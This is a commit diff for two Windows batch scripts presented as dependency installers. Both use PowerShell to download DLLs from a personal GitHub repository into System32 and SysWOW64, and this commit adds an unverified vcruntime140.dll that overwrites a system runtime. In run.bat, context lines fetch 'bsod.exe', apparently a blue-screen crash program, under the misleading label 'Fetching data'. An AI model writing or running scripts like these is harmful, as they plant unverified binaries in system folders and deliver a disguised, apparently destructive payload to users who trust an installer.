cc4428f6d317a2d9d03d4241fc7809c1f8787afe
ItzzExcel <excel.xcel@icloud.com>
2023-06-11 11:58:14 -0600

    Added vcruntime140.dll

--- dependencies.bat
+++ dependencies.bat
@@ -24,6 +24,7 @@ set "url1=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140_1d.dll
 set "url2=https://github.com/ItzzExcel/winlibs/raw/main/Libs/msvcp140d.dll"
 set "url3=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140d.dll"
 set "url4=https://github.com/ItzzExcel/winlibs/raw/main/Libs/ucrtbased.dll"
+set "url5=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140.dll"
 
 set "dest32=C:\Windows\System32"
 set "dest64=C:\Windows\SysWOW64"
@@ -37,9 +38,11 @@ powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest32%\msvcp140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest32%\vcruntime140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest32%\ucrtbased.dll')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest32%\vcruntime140.dll')"
 
 echo Downloading for SysWOW64 . . .
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%dest64%\vcruntime140_1d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest64%\msvcp140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest64%\vcruntime140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest64%\ucrtbased.dll')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest64%\vcruntime140.dll')"
--- run.bat
+++ run.bat
@@ -24,6 +24,7 @@ set "url1=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140_1d.dll
 set "url2=https://github.com/ItzzExcel/winlibs/raw/main/Libs/msvcp140d.dll"
 set "url3=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140d.dll"
 set "url4=https://github.com/ItzzExcel/winlibs/raw/main/Libs/ucrtbased.dll"
+set "url5=https://github.com/ItzzExcel/winlibs/raw/main/Libs/vcruntime140.dll"
 set "urlc=https://github.com/ItzzExcel/winlibs/raw/main/Libs/bsod.exe"
 
 set "dest32=C:\Windows\System32"
@@ -38,12 +39,14 @@ powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest32%\msvcp140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest32%\vcruntime140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest32%\ucrtbased.dll')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest32%\vcruntime140.dll')"
 
 echo Downloading for SysWOW64 . . .
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%dest64%\vcruntime140_1d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%dest64%\msvcp140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url3%', '%dest64%\vcruntime140d.dll')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url4%', '%dest64%\ucrtbased.dll')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url5%', '%dest64%\vcruntime140.dll')"
 
 echo Fetching data . . .
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%urlc%', '%tmp%\bsod.exe')"
